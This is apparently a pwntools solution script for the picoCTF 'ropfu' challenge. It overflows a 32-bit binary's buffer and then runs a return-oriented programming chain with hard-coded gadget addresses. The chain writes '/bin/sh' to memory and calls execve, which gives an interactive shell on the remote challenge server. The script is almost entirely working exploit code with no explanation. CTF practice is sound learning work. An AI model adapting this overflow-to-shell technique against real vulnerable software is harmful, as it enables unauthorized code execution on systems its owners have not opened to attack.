#fermat-strings
import struct
from pwn import *

#####################################################change directory#################################3
level = "ropfu"
ip = "saturn.picoctf.net:57018"
dir = "/home/ayush/Work/picoCTF/BinaryExploitation/"+level

########################################operation mode#########################################
args.DEBUG = False
args.REMOTE = True
#####################################setup solution################################################
context.arch = 'i386'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
binary = ELF(dir + "/vuln")
#######################################start process#############################################
def conn():
    if args.REMOTE:
        return remote(ip.split(':')[0], ip.split(':')[1])
    elif args.DEBUG:
        return gdb.debug(binary.path, gdbscript="b *0x80b073a\n")
    else:
        return process([binary.path])
r = conn()

#####################ROP gadgets#################################

pop_eax = struct.pack("i", 0x80b073a)
nul_eax = struct.pack("i", 0x804fb80)
pop_ebx = struct.pack("i", 0x8049022)
pop_ecx = struct.pack("i", 0x8049e29)
write_to_edx = struct.pack("i", 0x80590f2)
pop_edx_ebx = struct.pack("i", 0x80583b9)
syscall = struct.pack("i", 0x804a3c2)
data_address = struct.pack("i", 0x080e5060)
next_data_address = struct.pack("i", 0x080e5064)
next_next_data_address = struct.pack("i", 0x080e5068)
bin_str = struct.pack("i", 0x6e69622f)
sh_str = struct.pack("i", 0x68732f)
execve_syscall = struct.pack("i", 0xb)

#####################making ROP chain###############################

overflow = b"A"*28
payload = overflow
payload += pop_edx_ebx
payload += data_address
payload += data_address
payload += pop_eax
payload += bin_str
payload += write_to_edx
payload += pop_edx_ebx
payload += next_data_address
payload += next_data_address
payload += pop_eax
payload += sh_str
payload += write_to_edx
payload += pop_ecx
payload += next_next_data_address
payload += pop_edx_ebx
payload += next_next_data_address
payload += data_address
payload += nul_eax
payload += write_to_edx
payload += pop_eax
payload += execve_syscall
payload += syscall

################# intraction to process to get shell#############################

r.sendlineafter("!", payload)

r.interactive()